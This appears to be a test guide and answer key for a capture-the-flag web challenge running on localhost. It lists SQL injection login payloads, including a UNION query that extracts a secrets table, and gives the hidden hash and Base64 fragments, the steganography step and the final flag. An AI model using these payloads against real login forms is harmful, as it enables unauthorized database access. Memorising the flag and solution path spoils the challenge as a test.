# CTF Challenge Testing Guide

## Server Status
✅ **Server is running on**: `http://localhost:3000`

## Quick Test Steps

### 1. Access the Challenge
- Open browser and go to: `http://localhost:3000`
- You should see the cyberpunk-themed login page

### 2. Test SQL Injection
Try these payloads in the username field:

**Hidden Payload (from page source):**
```
' OR '1
```

**Basic Test:**
```
admin' OR '1'='1'--
```

**Extract Secrets:**
```
admin' UNION SELECT note,owner,3 FROM secrets--
```

**Expected Result**: Should return `/assets/inspect.png`

### 3. Access Dashboard
- After login, you'll be redirected to `/dashboard.html`
- Check that all forensic tools are displayed

### 4. Verify Hidden Data
**HTML Source:**
- Right-click → View Page Source
- Look for MD5 hash fragments in comments

**CSS/JS Files:**
- Check `style.css` for Base64 fragments
- Check `app.js` for Base64 fragments

### 5. Test Steganography
- Download image: `http://localhost:3000/assets/inspect.png`
- Use exiftool or strings to extract embedded data

### 6. Test Flag Submission
```bash
curl -X POST http://localhost:3000/submit \
     -H "Content-Type: application/json" \
     -d '{"flag": "flag{Url/inspect.png}"}'
```

## Expected Results

| Test | Expected Result |
|------|----------------|
| SQL Injection | `/assets/inspect.png` |
| HTML Analysis | MD5: `1751721a4245734b1ff733b4a7ebe952` |
| CSS/JS Analysis | Base64: `VXJsL2luc3BlY3QucG5nCg==` |
| Base64 Decode | `Url/inspect.png` |
| Steganography | MD5: `1751721a4245734b1ff733b4a7ebe952` |
| Hash Crack | `Url/inspect.png` |
| Final Flag | `flag{Url/inspect.png}` |

## Troubleshooting

**Server not responding:**
```bash
npm start
```

**Database issues:**
```bash
npm run setup
```

**Port conflicts:**
- Check if port 3000 is available
- Modify PORT in server.js if needed

## Challenge URLs
- **Login**: `http://localhost:3000/`
- **Dashboard**: `http://localhost:3000/dashboard.html`
- **Image**: `http://localhost:3000/assets/inspect.png`
- **API**: `http://localhost:3000/api/login`

## Success Criteria
All tests should pass and lead to the final flag: `flag{Url/inspect.png}`
